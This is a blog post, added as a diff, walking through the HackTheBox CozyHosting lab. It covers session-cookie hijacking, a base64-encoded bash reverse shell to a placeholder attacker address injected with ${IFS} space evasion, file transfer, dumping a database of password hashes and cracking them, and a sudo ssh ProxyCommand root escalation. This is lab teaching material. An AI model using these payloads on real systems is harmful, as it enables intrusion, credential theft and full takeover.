@@ -1,0 +1,128 @@
+---
+layout: page
+title:  "CozyHosting"
+date:   2025-07-19 12:05:57 -0400
+categories: jekyll update
+---
+
+# CozyHosting
+
+HackTheBox: Easy
+
+> Cozyhosting is an Ubuntu system when you can practices technique as cookie hijacking, reverse shells, password hashing.
+> 
+
+## 1: Enumeration
+
+- Check the active connection
+
+![Untitled]({{ '/assets/images/cozyhosting/Untitled.png' | relative_url }})
+
+- Scanning ports
+
+![Untitled](/assets/images/cozyhosting/Untitled%201.png)
+
+We can see there’s a web services running in 80 port and ssh service in 22 port it could be a way to get in later.
+
+- Dirsearch looking for enable directories
+
+![Untitled](/assets/images/cozyhosting/Untitled%202.png)
+
+Something interesting in /actuator/sessions
+
+## 2: Looking around
+
+- There is a possible cookie hijacking vulnerability.
+
+![Untitled](/assets/images/cozyhosting/Untitled%203.png)
+
+- We can use BurpSuite
+
+![Untitled](/assets/images/cozyhosting/Untitled%204.png)
+
+- We simulate the log in process and inject the cookie, we change it at the right side bar
+
+![Untitled](/assets/images/cozyhosting/Untitled%205.png)
+
+![Untitled](/assets/images/cozyhosting/Untitled%206.png)
+
+## 3: User flag
+
+- It executes commands, so get can make a rev shell to get access
+
+```bash
+echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
+```
+
+```bash
+;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+```
+
+${IFS%??} For blank spaces and convert it to url format
+
+- We use nc to receive the connection and make the shell stable like this
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+```
+
+We use cat etc/passwd for user
+
+- We’ve got and .jar with db credentials, using python
+
+```bash
+python3 -m http.server 7777
+```
+
+```bash
+wget http://10.10.00.000:7777/<file_name>
+```
+
+- Look for creds:
+
+![Untitled](/assets/images/cozyhosting/Untitled%207.png)
+
+```bash
+psql -h 127.0.0.1 -U postgres
+```
+
+```bash
+\c cozyhosting
+```
+
+```bash
+\d
+select * from users;
+```
+
+We got the hash for admin, we solve using
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+We use ssh to break into
+
+```bash
+ssh josh@10.10.11.230
+```
+
+## 4: Priv esc
+
+- Using sudo -l
+
+![Untitled](/assets/images/cozyhosting/Untitled%208.png)
+
+- In [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo) We find a way to get root access easily
+
+```bash
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+```
+
+![Untitled](/assets/images/cozyhosting/Untitled%209.png)
+
+- Machine pwned
+![Untitled](/assets/images/cozyhosting/Untitled%2010.png)
